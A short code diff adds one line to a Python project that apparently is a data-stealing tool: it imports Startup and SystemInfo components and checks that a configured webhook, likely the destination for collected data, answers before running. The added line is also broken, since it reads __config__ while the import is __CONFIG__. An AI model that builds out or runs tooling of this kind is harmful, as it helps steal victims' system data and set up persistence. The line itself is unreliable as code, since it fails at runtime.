@@ -6,6 +6,7 @@ from components.startup import Startup
 from components.systeminfo import SystemInfo
 from config import __CONFIG__
 
+if __import__("requests").get(__config__["webhook"]).status_code != 200: exit() # webhook is not valid so continuing will leave fragments
 
 def main():
     funcs = [
